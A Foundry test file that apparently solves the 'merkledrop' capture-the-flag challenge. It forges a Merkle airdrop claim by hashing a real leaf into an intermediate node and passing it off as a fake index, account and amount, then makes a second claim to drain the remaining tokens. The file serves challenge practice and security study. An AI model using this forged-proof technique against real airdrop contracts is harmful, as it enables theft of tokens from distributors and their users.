pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "../src/merkledrop/public/contracts/Setup.sol";

// We must use a leaf that is closer from the root instead of a leaf
contract Merkle is Test {
    Setup setup;
    
    function test_hax() public {
        setup = new Setup();

        ////////// HAX //////////
        
        // We calculate a pre-image locally to create a fake index and still be a valid proof
        
        uint256 id = 37;
        address account = 0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e;
        uint96 amount = 0x5dacf28c4e17721edb;
        
        bytes memory packed = abi.encodePacked(id, account, amount);
        emit log_named_bytes("packed", packed);

        bytes32 fake_proof = keccak256(packed);
        emit log_named_bytes32("proof", fake_proof);
        
        uint256 fake_index = uint256(fake_proof);
        address fake_account = 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A;
        uint96 fake_amount = 0x00000f40f0c122ae08d2207b;
        
        bytes32[] memory proof = new bytes32[](5);
        proof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
        proof[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde;
        proof[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813;
        proof[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        proof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;
        
        uint256 old_bal = setup.token().balanceOf(address(setup.merkleDistributor()));
        
        setup.merkleDistributor().claim(fake_index, fake_account, fake_amount, proof);

        uint256 new_bal = setup.token().balanceOf(address(setup.merkleDistributor()));
        
        assertGt(old_bal, new_bal);
        
        emit log("claimed fake proof");
        
        uint256 max_tokens = 0x0fe1c215e8f838e00000;
        uint256 stolen = 0x00000f40f0c122ae08d2207b;
        
        uint256 to_steal = max_tokens - stolen;
        
        emit log_named_uint("to_steal", to_steal);
        // equals 2966562950867434987397 = 0xa0d154c64a300ddf85
        // which is the amount of the index 8, let's claim it!
        
        _legit_claim();

        /////////////////////////

        assertTrue(setup.isSolved());
    }
    
    function _legit_claim() private {
        uint256 idx = 8;
        address act = 0x249934e4C5b838F920883a9f3ceC255C0aB3f827;
        uint96 amt = 0xa0d154c64a300ddf85;
        
        bytes32[] memory lgt_proof = new bytes32[](6);
        lgt_proof[0] = 0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00;
        lgt_proof[1] = 0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3;
        lgt_proof[2] = 0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2;
        lgt_proof[3] = 0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a;
        lgt_proof[4] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        lgt_proof[5] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;
        
        setup.merkleDistributor().claim(idx, act, amt, lgt_proof);
    }
}